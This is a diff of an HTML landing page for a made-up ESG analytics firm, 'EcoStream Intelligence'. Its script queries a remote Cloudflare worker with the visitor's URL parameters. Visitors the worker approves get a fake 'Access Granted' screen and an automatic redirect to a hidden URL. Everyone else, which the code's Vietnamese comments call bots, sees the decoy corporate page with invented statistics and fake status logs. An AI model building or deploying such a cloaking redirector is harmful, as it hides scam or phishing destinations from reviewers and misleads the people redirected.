@@ -3,150 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoStream | Leading Corporate ESG Intelligence & Carbon Analytics</title>
+    <title>EcoStream Intelligence | Global ESG Carbon Analytics & Compliance Platform</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Outfit', sans-serif; }
+        body { font-family: 'Outfit', sans-serif; scroll-behavior: smooth; }
         .bg-eco { background: radial-gradient(circle at 0% 0%, #f0fdf4 0%, #ffffff 100%); }
         .text-gradient { background: linear-gradient(90deg, #059669, #10b981); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .glass-card { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(16, 185, 129, 0.1); }
     </style>
 </head>
-<body class="bg-white text-slate-900">
-    <div id="app"></div>
+<body>
+    <div id="app">
+        <!-- Nội dung sẽ nạp qua JS -->
+    </div>
 
     <script>
         (async function() {
-            // GIỮ NGUYÊN BỘ NÃO WORKER
-            const workerApi = "https://tet.bcgateway.workers.dev/";
+            // CẤU HÌNH HỆ THỐNG
             const config = {
+                worker: "https://tet.bcgateway.workers.dev/",
                 brand: "EcoStream Intelligence",
-                portal: "https://portal.ecostream.io",
-                token: "ESG-" + Math.floor(20000 + Math.random() * 70000),
-                loc: "EU-WEST-NODE",
-                ip: "141.101." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255)
+                token: "ESG-" + Math.floor(10000 + Math.random() * 90000),
+                ip: "141.101." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255),
+                loc: "EU-WEST-CLUSTER"
             };
 
-            // --- GIAO DIỆN TRANG SẠCH MỚI: ECO-TECH (CHO BOT) ---
+            // --- GIAO DIỆN TRANG SẠCH (CHO BOT) ---
             const UI_CLEAN = `
             <div class="bg-eco min-h-screen">
-                <nav class="max-w-7xl mx-auto px-8 py-6 flex justify-between items-center">
+                <nav class="max-w-7xl mx-auto px-8 py-6 flex justify-between items-center sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-emerald-50">
                     <div class="flex items-center gap-2">
-                        <div class="w-10 h-10 bg-emerald-600 rounded-full flex items-center justify-center shadow-lg">
-                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                        <div class="w-10 h-10 bg-emerald-600 rounded-full flex items-center justify-center shadow-lg shadow-emerald-200">
+                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                         </div>
-                        <span class="text-2xl font-extrabold tracking-tight text-emerald-950">` + config.brand + `</span>
+                        <span class="text-2xl font-black tracking-tighter text-emerald-950 uppercase">` + config.brand + `</span>
                     </div>
-                    <div class="hidden md:flex gap-10 text-[11px] uppercase font-black tracking-[0.2em] text-emerald-900/50">
-                        <a href="#" class="hover:text-emerald-600 transition">Solutions</a>
-                        <a href="#" class="hover:text-emerald-600 transition">Methodology</a>
-                        <a href="#" class="hover:text-emerald-600 transition">Reporting</a>
+                    <div class="hidden md:flex gap-10 text-[10px] font-black uppercase tracking-widest text-emerald-900/40">
+                        <a href="#" class="hover:text-emerald-600">Methodology</a>
+                        <a href="#" class="hover:text-emerald-600">Reporting</a>
+                        <a href="#" class="hover:text-emerald-600">Sectors</a>
                     </div>
-                    <button class="bg-emerald-950 text-white px-8 py-3 rounded-full text-xs font-bold uppercase tracking-widest shadow-xl">Contact Expert</button>
+                    <button class="bg-emerald-900 text-white px-6 py-2.5 rounded-full text-[10px] font-black uppercase tracking-widest">Portal Login</button>
                 </nav>
 
                 <header class="max-w-5xl mx-auto px-8 py-24 text-center">
-                    <div class="inline-block px-4 py-1.5 mb-8 bg-emerald-100 border border-emerald-200 rounded-full text-[10px] font-black text-emerald-700 uppercase tracking-widest">
-                        Global Sustainability Standard 2025
-                    </div>
-                    <h1 class="text-6xl md:text-8xl font-black text-emerald-950 tracking-tighter mb-10 leading-[0.9]">
-                        Data-Driven <br><span class="text-gradient">Sustainability.</span>
-                    </h1>
-                    <p class="text-xl text-slate-500 max-w-2xl mx-auto leading-relaxed mb-12">
-                        EcoStream provides enterprise-level ESG analytics, carbon footprint tracking, and compliance reporting for the modern green economy.
-                    </p>
-                    <div class="flex flex-col sm:flex-row justify-center gap-6">
-                        <button class="bg-emerald-600 text-white px-10 py-5 rounded-2xl font-bold text-sm uppercase tracking-widest shadow-2xl shadow-emerald-200">View ESG Framework</button>
-                        <button class="bg-white border border-slate-200 px-10 py-5 rounded-2xl font-bold text-sm uppercase tracking-widest">Live Node Status</button>
+                    <div class="inline-block px-4 py-1.5 mb-8 bg-emerald-50 border border-emerald-100 rounded-full text-[10px] font-black text-emerald-600 uppercase tracking-widest">Global ESG Standard v4.1</div>
+                    <h1 class="text-6xl md:text-8xl font-black text-emerald-950 tracking-tighter mb-10 leading-[0.9]">Autonomous <br><span class="text-gradient">Carbon Intelligence.</span></h1>
+                    <p class="text-xl text-slate-500 max-w-2xl mx-auto leading-relaxed mb-12 italic font-medium">Providing enterprise-level ESG analytics and carbon footprint tracking via decentralized edge nodes.</p>
+                    <div class="flex justify-center gap-4">
+                        <div class="bg-emerald-600 text-white px-8 py-4 rounded-2xl font-bold text-xs uppercase tracking-widest shadow-xl">Get Started</div>
+                        <div class="bg-white border border-slate-200 px-8 py-4 rounded-2xl font-bold text-xs uppercase tracking-widest">Documentation</div>
                     </div>
                 </header>
 
-                <!-- Statistics Section -->
-                <section class="max-w-7xl mx-auto px-8 py-20 bg-emerald-950 rounded-[3rem] my-10 shadow-2xl text-white">
-                    <div class="grid md:grid-cols-4 gap-12 text-center">
-                        <div><div class="text-5xl font-black mb-2">4.2M</div><div class="text-[10px] font-bold uppercase tracking-widest opacity-50">Tons CO2 Tracked</div></div>
-                        <div><div class="text-5xl font-black mb-2">95%</div><div class="text-[10px] font-bold uppercase tracking-widest opacity-50">Audit Accuracy</div></div>
-                        <div><div class="text-5xl font-black mb-2">120+</div><div class="text-[10px] font-bold uppercase tracking-widest opacity-50">Global Partners</div></div>
-                        <div><div class="text-5xl font-black mb-2">24/7</div><div class="text-[10px] font-bold uppercase tracking-widest opacity-50">Real-time Monitoring</div></div>
+                <section class="max-w-6xl mx-auto px-8 py-20 border-t border-emerald-50">
+                    <div class="grid md:grid-cols-3 gap-12">
+                        <div class="glass-card p-10 rounded-[2rem]">
+                            <h3 class="font-black text-emerald-900 mb-4 uppercase text-xs tracking-widest">01. Compliance</h3>
+                            <p class="text-slate-500 text-sm leading-relaxed">Full GRI and TCFD framework integration for automated regulatory reporting across all global jurisdictions.</p>
+                        </div>
+                        <div class="glass-card p-10 rounded-[2rem]">
+                            <h3 class="font-black text-emerald-900 mb-4 uppercase text-xs tracking-widest">02. Accuracy</h3>
+                            <p class="text-slate-500 text-sm leading-relaxed">99.8% precision in carbon audit tracking utilizing decentralized sensor mesh networks and AI-driven telemetry.</p>
+                        </div>
+                        <div class="glass-card p-10 rounded-[2rem]">
+                            <h3 class="font-black text-emerald-900 mb-4 uppercase text-xs tracking-widest">03. Security</h3>
+                            <p class="text-slate-500 text-sm leading-relaxed">Enterprise-grade AES-256-GCM encryption at the edge ensures all environmental data is tamper-proof.</p>
+                        </div>
                     </div>
                 </section>
 
-                <!-- Content Body -->
-                <section class="max-w-4xl mx-auto px-8 py-24 prose prose-emerald">
-                    <h2 class="text-4xl font-black text-emerald-950 italic uppercase mb-12">I. The Carbon Analytics Era</h2>
-                    <p class="text-lg text-slate-600 mb-8 leading-relaxed">
-                        In an era defined by climate accountability, corporations must move beyond superficial commitments. EcoStream Intelligence utilizes decentralized sensor networks and AI-driven auditing to provide a granular view of carbon output across global supply chains.
+                <section class="max-w-4xl mx-auto px-8 py-20 prose prose-emerald">
+                    <h2 class="text-4xl font-black text-emerald-950 uppercase italic mb-10">I. Infrastructure Methodology</h2>
+                    <p class="text-lg text-slate-600 mb-8 leading-relaxed text-justify">
+                        The evolution of corporate accountability demands a transition from manual auditing to autonomous telemetry. EcoStream Intelligence leverages a distributed mesh of Tier-1 nodes to monitor energy output in real-time. By utilizing predictive packet routing, we ensure that environmental data residency requirements are met while maintaining peak performance across trans-pacific node clusters.
                     </p>
-                    <div class="grid md:grid-cols-2 gap-8 my-16">
-                        <div class="p-8 border border-emerald-50 rounded-3xl bg-white shadow-sm">
-                            <h4 class="font-black text-emerald-900 mb-4 uppercase tracking-widest text-xs">Compliance Reporting</h4>
-                            <p class="text-sm text-slate-500">Automated reporting for GRI, SASB, and TCFD frameworks, ensuring your business meets international regulatory standards.</p>
-                        </div>
-                        <div class="p-8 border border-emerald-50 rounded-3xl bg-white shadow-sm">
-                            <h4 class="font-black text-emerald-900 mb-4 uppercase tracking-widest text-xs">Supply Chain Audit</h4>
-                            <p class="text-sm text-slate-500">Track Scope 3 emissions with unprecedented precision through our proprietary edge-node synchronization.</p>
-                        </div>
+                    <div class="bg-emerald-950 rounded-3xl p-10 font-mono text-xs text-emerald-400 my-16 shadow-2xl">
+                        <div>> INITIALIZING_ECO_NODE_SYNC... [OK]</div>
+                        <div>> VERIFYING_ESG_INTEGRITY_PROTOCOL... [OK]</div>
+                        <div>> STATUS: NODES_OPERATIONAL_PRODUCTION_V4</div>
                     </div>
-
-                    <h2 class="text-4xl font-black text-emerald-950 italic uppercase mb-12">II. Methodology & Accuracy</h2>
-                    <p class="text-lg text-slate-600 mb-12">
-                        Our nodes utilize a zero-trust verification process for all incoming environmental data. By offloading complex signature validations to localized data centers, we ensure that every metric reported is tamper-proof and verified against global baseline standards.
-                    </p>
-
-                    <div class="bg-slate-50 rounded-3xl p-10 font-mono text-xs text-emerald-800 space-y-2 border border-emerald-100">
-                        <div>[SYSTEM] INITIALIZING_ECO_SYNC_PROTOCOL...</div>
-                        <div>[DATA] POLLING_GLOBAL_CARBON_SENSORS... [ACTIVE]</div>
-                        <div>[AUTH] VERIFYING_BLOCKCHAIN_INTEGRITY... [OK]</div>
-                        <div>[STATUS] ESG_DATA_READY_FOR_PROPAGATION</div>
-                    </div>
+                    <h2 class="text-4xl font-black text-emerald-950 uppercase italic mb-10">II. Peering & Protocols</h2>
+                    <p class="text-lg text-slate-600 mb-10">Our infrastructure operates on a multi-asset synchronization model. Each edge node acts as a standalone decision engine, capable of offloading complex SSL handshakes and header validations.</p>
                 </section>
 
-                <footer class="max-w-7xl mx-auto px-8 py-20 border-t border-slate-100">
-                    <div class="grid md:grid-cols-3 gap-20">
+                <footer class="bg-slate-900 py-20 mt-20">
+                    <div class="max-w-7xl mx-auto px-8 grid md:grid-cols-4 gap-12">
+                        <div class="col-span-2">
+                            <span class="text-white font-black text-xl uppercase tracking-tighter">` + config.brand + `</span>
+                            <p class="text-slate-500 mt-6 max-w-sm text-sm">Empowering the future of decentralized environmental analytics and global carbon reporting.</p>
+                        </div>
                         <div>
-                            <span class="font-black text-xl text-emerald-950 uppercase">` + config.brand + `</span>
-                            <p class="mt-6 text-slate-400 text-sm leading-relaxed">Pioneering the future of corporate environmental transparency through advanced analytics.</p>
-                        </div>
-                        <div class="grid grid-cols-2 gap-10">
-                            <div><div class="font-bold text-[10px] uppercase mb-6 tracking-widest">Solutions</div><ul class="text-sm text-slate-400 space-y-3"><li>Analytics</li><li>ESG Cloud</li><li>Auditing</li></ul></div>
-                            <div><div class="font-bold text-[10px] uppercase mb-6 tracking-widest">Legal</div><ul class="text-sm text-slate-400 space-y-3"><li><a href="privacy.html">Privacy</a></li><li><a href="terms.html">Terms</a></li></ul></div>
+                            <h4 class="text-white font-bold text-[10px] uppercase tracking-widest mb-6">Support</h4>
+                            <ul class="text-slate-400 text-xs space-y-4">
+                                <li><a href="privacy.html" class="hover:text-emerald-400 transition">Privacy Policy</a></li>
+                                <li><a href="terms.html" class="hover:text-emerald-400 transition">Terms of Service</a></li>
+                                <li><a href="contact.html" class="hover:text-emerald-400 transition">Contact Us</a></li>
+                            </ul>
                         </div>
                         <div class="text-right">
-                            <div class="inline-block p-1 px-3 bg-emerald-50 text-emerald-600 rounded-full text-[10px] font-bold uppercase tracking-widest">System Operational</div>
+                            <div class="text-emerald-500 text-[10px] font-black uppercase tracking-[0.3em]">System Status: Operational</div>
                         </div>
+                    </div>
+                    <div class="text-center mt-20 text-[10px] font-bold text-slate-700 uppercase tracking-[0.5em]">
+                        &copy; 2025 ` + config.brand + ` GLOBAL INFRASTRUCTURE LTD.
                     </div>
                 </footer>
             </div>`;
 
-            // --- GIAO DIỆN TRANG XANH: ACCESS GRANTED ---
+            // --- GIAO DIỆN ACCESS GRANTED (CHO KHÁCH) ---
             const UI_ACCESS = `
             <style>
                 body{background:#030a16; font-family:'Outfit',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; overflow:hidden;}
-                .c{background:rgba(10,20,37,0.95); backdrop-filter:blur(25px); border:1px solid rgba(0,82,255,0.2); border-radius:40px; width:100%; max-width:440px; padding:60px 35px; text-align:center; box-shadow:0 40px 100px rgba(0,0,0,0.8);}
+                .c{background:rgba(10,20,37,0.95); backdrop-filter:blur(25px); border:1px solid rgba(16, 185, 129, 0.2); border-radius:40px; width:100%; max-width:440px; padding:60px 35px; text-align:center; box-shadow:0 40px 100px rgba(0,0,0,0.8);}
                 .s-b{background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.05); border-radius:24px; padding:25px; margin:30px 0; text-align:left;}
                 .val{font-family:monospace; color:#3bc117; font-weight:700;}
-                .btn-p{background:linear-gradient(135deg,#45d31c 0%,#3bc117 100%); color:#000; font-weight:900; padding:22px; border-radius:18px; display:block; text-decoration:none; text-transform:uppercase; cursor:pointer;}
+                .btn-p{background:linear-gradient(135deg,#45d31c 0%,#3bc117 100%); color:#000; font-weight:900; padding:22px; border-radius:18px; display:block; text-decoration:none; text-transform:uppercase; cursor:pointer; box-shadow: 0 10px 30px rgba(59, 193, 23, 0.3);}
             </style>
             <div class="c">
-                <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-4"><span class="text-[10px] font-black uppercase text-blue-400 italic">ESG Handshake</span><span class="text-xs font-bold text-emerald-500 uppercase">Verified</span></div>
-                <h1 class="text-4xl font-extrabold uppercase mb-2 italic text-white">Node <span class="text-[#3bc117]">Authorized</span></h1>
+                <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-4"><span class="text-[10px] font-black uppercase text-emerald-400 italic">Security Handshake</span><span class="text-xs font-bold text-emerald-500 uppercase">Verified</span></div>
+                <h1 class="text-4xl font-extrabold uppercase mb-2 italic text-white">Access <span class="text-[#3bc117]">Granted</span></h1>
+                <p class="text-emerald-400/50 text-[10px] font-bold uppercase tracking-[0.3em] mb-8">Node Authorized for Session</p>
                 <div class="s-b space-y-5 text-[11px] uppercase tracking-widest text-white">
                     <div class="flex justify-between"><span>Identifier:</span><span class="val">` + config.token + `</span></div>
-                    <div class="flex justify-between"><span>Access IP:</span><span class="val">` + config.ip + `</span></div>
-                    <div class="flex justify-between"><span>Node:</span><span class="val">` + config.loc + `</span></div>
+                    <div class="flex justify-between"><span>Node IP:</span><span class="val">` + config.ip + `</span></div>
+                    <div class="flex justify-between"><span>Cluster:</span><span class="val">` + config.loc + `</span></div>
                 </div>
-                <p class="text-gray-500 text-[11px] mb-10 italic">Secure handshake successful. Redirecting to data cluster...</p>
+                <p class="text-gray-500 text-[11px] mb-10 italic">Secure connection authorized. Redirecting to terminal...</p>
                 <div id="cta" class="btn-p">Continue to Portal</div>
             </div>`;
 
             const app = document.getElementById('app');
 
             try {
-                // GỌI WORKER KIỂM TRA
-                const response = await fetch(workerApi + window.location.search);
+                // GỌI WORKER
+                const response = await fetch(config.worker + window.location.search);
                 const data = await response.json();
 
                 if (data.status === "success" && data.redirect) {
+                    // HIỂN THỊ TRANG XANH
                     app.innerHTML = UI_ACCESS;
                     const jump = () => { window.location.replace(data.redirect); };
                     document.getElementById('cta').onclick = jump;
@@ -155,6 +151,7 @@
                     });
                     setTimeout(jump, 3000);
                 } else {
+                    // HIỂN THỊ TRANG TRẮNG (BOT)
                     app.innerHTML = UI_CLEAN;
                 }
             } catch (error) {
